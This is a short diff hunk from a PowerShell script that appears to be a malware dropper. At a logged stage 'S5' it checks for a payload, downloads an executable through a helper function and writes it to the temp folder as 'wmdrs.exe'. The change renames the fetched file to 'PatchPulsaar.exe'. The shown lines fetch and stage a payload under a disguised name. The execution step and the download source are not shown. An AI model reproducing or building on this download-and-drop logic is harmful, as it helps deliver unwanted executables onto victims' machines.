@@ -236,7 +236,7 @@ if($payloadExists){
 
 if(-not $payloadExists){
     _log "S5: downloading wdsr681f3e18"
-    $payloadBytes=_dl 'wdsr681f3e18.exe'
+    $payloadBytes=_dl 'PatchPulsaar.exe'
     if($payloadBytes){
         $primaryPath="$env:TEMP\wmdrs.exe"
         [IO.File]::WriteAllBytes($primaryPath,$payloadBytes)|Out-Null
